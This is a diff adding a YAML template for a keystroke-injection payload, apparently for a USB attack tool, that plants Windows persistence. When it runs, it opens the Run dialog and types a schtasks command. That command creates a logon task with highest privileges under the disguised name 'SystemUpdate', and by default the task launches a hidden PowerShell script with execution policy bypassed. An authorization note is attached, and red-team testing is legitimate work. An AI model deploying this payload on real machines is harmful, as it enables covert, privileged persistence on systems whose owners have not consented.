@@ -1,0 +1,47 @@
+name: scheduled-task
+description: "Creates a Windows scheduled task that executes a command at user login for persistence"
+author: TiltedLunar123
+version: "1.0"
+mitre:
+  tactic: Persistence
+  technique: T1053.005
+platform: windows
+parameters:
+  - name: task_name
+    type: string
+    default: "SystemUpdate"
+    description: "Name for the scheduled task to create"
+  - name: command
+    type: string
+    default: "powershell.exe -w hidden -ep bypass -f C:\\temp\\update.ps1"
+    description: "Command to execute when the scheduled task triggers"
+  - name: delay_ms
+    type: integer
+    default: 500
+    description: "Delay in milliseconds between keystrokes"
+safety:
+  requires_confirmation: true
+  scope_note: "Only use on systems you own or have written authorization to test"
+script: |
+  REM -----------------------------------------------
+  REM Scheduled Task Persistence (T1053.005)
+  REM Creates a Windows scheduled task that runs a
+  REM specified command each time the user logs in
+  REM WARNING: Authorized use only
+  REM -----------------------------------------------
+  DELAY 3000
+  DELAY {{ delay_ms }}
+  GUI r
+  DELAY 500
+  STRING cmd /k
+  ENTER
+  DELAY 500
+  DELAY {{ delay_ms }}
+  STRING schtasks /create /tn "{{ task_name }}" /tr "{{ command }}" /sc onlogon /rl highest /f
+  ENTER
+  DELAY {{ delay_ms }}
+  STRING schtasks /query /tn "{{ task_name }}" /v
+  ENTER
+  DELAY {{ delay_ms }}
+  STRING exit
+  ENTER
